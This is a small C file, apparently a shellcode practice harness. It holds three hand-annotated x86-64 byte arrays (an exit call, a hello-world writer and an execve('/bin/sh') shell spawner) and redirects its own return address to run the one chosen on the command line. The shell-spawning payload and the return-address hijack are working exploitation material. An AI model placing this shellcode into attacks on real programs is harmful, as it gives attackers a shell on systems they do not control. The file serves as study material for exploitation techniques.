#include <stdio.h>
#include <unistd.h>

//check for return value of 0x31 - echo $? after execution
char exit_code[] = 	"\x48\x31\xc0"		// xor    %rax,%rax
	"\xb0\x3c"							// mov    $0x3c,%al
	"\x48\x31\xff"						// xor    %rdi,%rdi
	"\x40\xb7\x31"						// mov    $0x31,%dil
	"\x0f\x05";							// syscall 

char hello_world_code[] =	"\xeb\x1a"	// jmp    40009c <_start+0x1c>
	"\x48\x31\xc0"						// xor    %rax,%rax
	"\xb0\x01"							// mov    $0x1,%al
	"\x48\x31\xff"						// xor    %rdi,%rdi
	"\x40\xb7\x01"						// mov    $0x1,%dil
	"\x5e"								// pop    %rsi
	"\x48\x31\xd2"						// xor    %rdx,%rdx
	"\xb2\x0f"							// mov    $0xf,%dl
	"\x0f\x05"							// syscall 
	"\x48\x31\xc0"						// xor    %rax,%rax
	"\xb0\x3c"							// mov    $0x3c,%al
	"\x0f\x05"							// syscall 
	"\xe8\xe1\xff\xff\xff"				// callq  400082 <_start+0x2>
	"Hello World!\n";

char shellcode[] = "\xeb\x14"			// jmp    400096 <_start+0x16>
	"\x48\x31\xc0"						// xor    %rax,%rax
	"\x50"								// push   %rax
	"\x5a"								// pop    %rdx
	"\x5f"								// pop    %rdi
	"\x50"								// push   %rax
	"\x48\x89\xf8"						// mov    %rdi,%rax
	"\x50"								// push   %rax
	"\x54"								// push   %rsp
	"\x5e"								// pop    %rsi
	"\x48\x31\xc0"						// xor    %rax,%rax
	"\xb0\x3b"							// mov    $0x3b,%al
	"\x0f\x05"							// syscall 
	"\xe8\xe7\xff\xff\xff"				// callq  400082 <_start+0x2>
	"/bin/sh";

int main(int argc, char **argv) {
	int *ret; 
	//ret points to the return address now
	ret =  (int *)&ret + 4;
	switch (argv[1][0]) {
		case '1':	
			(*ret) = (int)exit_code; 
			break;
		case '2':
			(*ret) = (int)hello_world_code;
			break;
		default:
			(*ret) = (int)shellcode;
	}
	return 0;
}
